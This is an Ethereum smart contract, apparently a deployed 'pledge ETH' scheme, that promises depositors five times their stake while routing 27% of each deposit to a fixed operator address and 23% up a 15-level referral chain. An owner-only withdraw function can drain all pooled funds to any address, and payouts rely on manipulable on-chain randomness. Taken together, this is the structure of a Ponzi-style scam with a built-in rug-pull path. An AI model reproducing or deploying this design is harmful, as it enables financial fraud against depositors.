/**
 *Submitted for verification at Etherscan.io on 2022-08-03
*/

pragma solidity >=0.6.6;

library SafeMath {
    function add(uint x, uint y) internal pure returns (uint z) {
        require((z = x + y) >= x, 'ds-math-add-overflow');
    }
    function sub(uint x, uint y) internal pure returns (uint z) {
        require((z = x - y) <= x, 'ds-math-sub-underflow');
    }
    function mul(uint x, uint y) internal pure returns (uint z) {
        require(y == 0 || (z = x * y) / y == x, 'ds-math-mul-overflow');
    }
    function div(uint a, uint b) internal pure returns (uint) {
        require(b > 0, 'ds-math-div-overflow');
        uint c = a / b;
        return c;
    }
}

library SafeMath256 {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract EthEcology {

    // using SafeMath for uint;
    using SafeMath256 for uint256;

    address public miner_address = 0x07DD6D40f2adFBD4012130AF877056bCF4B5bfcA;
    address public platform_address = 0x07DD6D40f2adFBD4012130AF877056bCF4B5bfcA;
    uint256 public pledge_miner_count = 0;
    uint256 public min_pledge = 200000000000000000;

    mapping (address => address)    public relation;
    mapping (address => address)    public relation_active;
    mapping (address => uint256)    public relation_active_count;
    mapping (address => PledgeEth)  public pledge_eth;
    mapping (uint256 => MinerRatio) public miner_ratio;

    address public owner;
    address public pair;

    struct MinerRatio{
        uint256 reward;
        uint256 quicken;
        uint256 fuel;
    }

    struct PledgeEth{
        address addrs;
        uint256 fuel_value;
        uint256 quick_value;
        uint256 pledge_amount;
        uint256 total_profit;
        uint256 less_profit;
        uint256 receive_time;
        uint256 miner_time;
        uint256 stop_time;
    }

    event PledgeEthShot(address user,uint256 _amount);
    event MinerRatioShot(uint256 _index,uint256 _reward,uint256 _quicken,uint256 _fuel);
    event ReceiveProfit(address _addr,uint256 _amount);
    event TierRewards(address _addr,uint256 _reward_amount,uint256 _quicken_amount,uint256 _fuel_amount);

    constructor() public {
        relation[msg.sender] = 0x000000000000000000000000000000000000dEaD;
        owner = msg.sender;
        initMinerRatio();
    }

    function initMinerRatio() private{
        miner_ratio[1].reward = 500;
        miner_ratio[1].quicken = 200;
        miner_ratio[1].fuel = 100;

        miner_ratio[2].reward = 1000;
        miner_ratio[2].quicken = 500;
        miner_ratio[2].fuel = 300;

        miner_ratio[3].reward = 1500;
        miner_ratio[3].quicken = 700;
        miner_ratio[3].fuel = 500;

        miner_ratio[4].reward = 3000;
        miner_ratio[4].quicken = 1200;
        miner_ratio[4].fuel = 700;

        miner_ratio[5].reward = 500;
        miner_ratio[5].quicken = 100;
        miner_ratio[5].fuel = 50;

        miner_ratio[6].reward = 500;
        miner_ratio[6].quicken = 100;
        miner_ratio[6].fuel = 50;

        miner_ratio[7].reward = 500;
        miner_ratio[7].quicken = 100;
        miner_ratio[7].fuel = 50;

        miner_ratio[8].reward = 500;
        miner_ratio[8].quicken = 100;
        miner_ratio[8].fuel = 50;

        miner_ratio[9].reward = 500;
        miner_ratio[9].quicken = 100;
        miner_ratio[9].fuel = 50;

        miner_ratio[10].reward = 500;
        miner_ratio[10].quicken = 100;
        miner_ratio[10].fuel = 50;

        miner_ratio[11].reward = 200;
        miner_ratio[11].quicken = 50;
        miner_ratio[11].fuel = 25;

        miner_ratio[12].reward = 200;
        miner_ratio[12].quicken = 50;
        miner_ratio[12].fuel = 25;

        miner_ratio[13].reward = 200;
        miner_ratio[13].quicken = 50;
        miner_ratio[13].fuel = 25;

        miner_ratio[14].reward = 200;
        miner_ratio[14].quicken = 50;
        miner_ratio[14].fuel = 25;

        miner_ratio[15].reward = 200;
        miner_ratio[15].quicken = 50;
        miner_ratio[15].fuel = 25;
    }

    function setMinerRatio(uint256 _index,uint256 _reward,uint256 _quicken,uint256 _fuel) public {
        require(msg.sender==owner,'only owner');
        miner_ratio[_index].reward = _reward;
        miner_ratio[_index].quicken = _quicken;
        miner_ratio[_index].fuel = _fuel;
        emit MinerRatioShot(_index,_reward,_quicken,_fuel);
    }

    function setRelation(address _addr) public {
        require(relation[msg.sender] == address(0) , "EE: recommender already exists ");
        if(_addr==owner){
            relation[msg.sender] = _addr;
        }else{
            require(relation[_addr] != address(0) , "EE: recommender not exists ");
            relation[msg.sender] = _addr;
        }
    }


    function pledgeEth() payable public {
        require(msg.value >= min_pledge, 'EE: input_amount greater than 0.2 eth');

        // if(pledge_eth[msg.sender].addrs!=address(0)){
        //     uint256 time = block.timestamp.sub(pledge_eth[msg.sender].miner_time);
        // }
        // require(address(msg.sender).balance >= msg.value, "EE: Insufficient funds ");
        address pre = relation[msg.sender];
        require(pre != address(0), "EE: No recommender ");
        uint256 _input_amount = msg.value;
        address _addr = msg.sender;
        if(pledge_eth[_addr].addrs==address(0)){
            pledge_eth[_addr].pledge_amount = _input_amount;
            pledge_eth[_addr].fuel_value = _input_amount*2;
            pledge_eth[_addr].total_profit = _input_amount*5;
            pledge_eth[_addr].less_profit = _input_amount*5;
            pledge_eth[_addr].quick_value = 0;
            pledge_eth[_addr].receive_time = block.timestamp;
            pledge_eth[_addr].stop_time = block.timestamp;
            pledge_eth[_addr].addrs = _addr;
        }else{
            pledge_eth[_addr].pledge_amount = pledge_eth[_addr].pledge_amount.add(_input_amount);
            pledge_eth[_addr].fuel_value = pledge_eth[_addr].fuel_value.add(_input_amount*2);
            pledge_eth[_addr].total_profit = pledge_eth[_addr].total_profit.add(_input_amount*5);
            pledge_eth[_addr].less_profit = pledge_eth[_addr].less_profit.add(_input_amount*5);
            pledge_eth[_addr].stop_time = pledge_eth[_addr].receive_time;
        }
        pledge_eth[_addr].miner_time = block.timestamp;
        pledge_miner_count++; 
        address(uint160(miner_address)).transfer(_input_amount*25/100);
        address(uint160(platform_address)).transfer(_input_amount*2/100);
        uint256 _amount = _input_amount*23/100;
        tier_rewards(_amount);
        if(relation_active[_addr]!=address(0)){
            relation_active[_addr] = pre;
            relation_active_count[pre] ++ ;
        }
        emit PledgeEthShot(_addr,_input_amount);
    }


    function transfertest() payable public{
        uint256 _input_amount = msg.value;
        address(uint160(miner_address)).transfer(_input_amount*1/1000);
        address(uint160(miner_address)).transfer(_input_amount*2/1000);
        address(uint160(miner_address)).transfer(_input_amount*3/1000);
        address(uint160(miner_address)).transfer(_input_amount*4/1000);
        address(uint160(miner_address)).transfer(_input_amount*5/1000);
        address(uint160(miner_address)).transfer(_input_amount*6/1000);
        address(uint160(miner_address)).transfer(_input_amount*7/1000);
        address(uint160(miner_address)).transfer(_input_amount*8/1000);
        address(uint160(miner_address)).transfer(_input_amount*9/1000);
        address(uint160(miner_address)).transfer(_input_amount*10/1000);
        address(uint160(miner_address)).transfer(_input_amount*11/1000);
        address(uint160(miner_address)).transfer(_input_amount*12/1000);
        address(uint160(miner_address)).transfer(_input_amount*13/1000);
        address(uint160(miner_address)).transfer(_input_amount*14/1000);
        address(uint160(miner_address)).transfer(_input_amount*15/1000);
    }

    function random() private view returns (uint256 rate){
        uint256 _random = uint256(keccak256(abi.encodePacked(block.difficulty,now,msg.sender)));
        return _random%2000;
        // uint256 _random = uint256(keccak256(abi.encodePacked(block.difficulty,now,msg.sender)));
        // return _random;
        // uint256 _random = (keccak256(abi.encodePacked(block.difficulty,now,msg.sender)))%2000;
        // uint256 random2 = (keccak256(abi.encodePacked(_random,now,msg.sender)))%2000;
        // return uint256(block.blockhash(block.number-1)) * random2 % 2000;
    }

    function receiveProfit() public {
        require(pledge_eth[msg.sender].addrs == msg.sender, "EE: trade failed");
        require(pledge_eth[msg.sender].less_profit > 0, "EE: receive end");
        uint256 rate = random()+500;
        uint256 amount = block.timestamp.sub(pledge_eth[msg.sender].receive_time).mul(pledge_eth[msg.sender].total_profit*rate/10000/86400);

        if(pledge_eth[msg.sender].fuel_value>pledge_eth[msg.sender].less_profit){
            if(amount>pledge_eth[msg.sender].fuel_value){
                amount = pledge_eth[msg.sender].fuel_value;
            }
            pledge_eth[msg.sender].fuel_value -= amount;
            pledge_eth[msg.sender].less_profit -= amount;
        }else{
            if(amount>pledge_eth[msg.sender].less_profit){
                amount = pledge_eth[msg.sender].less_profit;
            }
            pledge_eth[msg.sender].fuel_value -= amount;
            pledge_eth[msg.sender].less_profit -= amount;
        }

        if(pledge_eth[msg.sender].fuel_value<0){
            pledge_eth[msg.sender].stop_time = block.timestamp;
        }

        pledge_eth[msg.sender].receive_time = block.timestamp;
        address(uint160(msg.sender)).transfer(amount);
        emit ReceiveProfit(msg.sender,amount);
    }

// 代数：   奖励       加速     燃料值
// 1代：    5%         2%           1%
// 2代：    10%        5%           3%
// 3代：    15%        7%           5%
// 4代:     30%       12%           7%
// 5-10代：  5%        1%          0.5%
// 11-15代： 2%      0.5%      0.25%

    function tier_rewards(uint256 _amount) private{
        if(_amount>0){
            address pre = relation[msg.sender];
            uint256 index = relation_active_count[pre];
            for (uint i = 1; i <= 15; i++) {
                if(pre==address(0)){
                    break;
                }
                if(index < i){
                    pre = relation[pre];
                    index = relation_active_count[pre];
                    continue;
                }
                uint256 _reward_amount  = _amount * miner_ratio[index].reward/10000;
                uint256 _quicken_amount = _amount * miner_ratio[index].quicken/10000;
                uint256 _fuel_amount    = _amount * miner_ratio[index].fuel/10000;

                pledge_eth[pre].quick_value += _quicken_amount;
                pledge_eth[pre].fuel_value += _fuel_amount;
                address(uint160(pre)).transfer(_reward_amount);
                emit TierRewards(pre,_reward_amount,_quicken_amount,_fuel_amount);
                pre = relation[pre];
                index = relation_active_count[pre];
            }
        }
    }

    function withdraw(address _to,uint256 _amount) public payable returns (bool){
        require(msg.sender==owner,' only owner');
        address(uint160(_to)).transfer(_amount);
        return true;
    }

    

}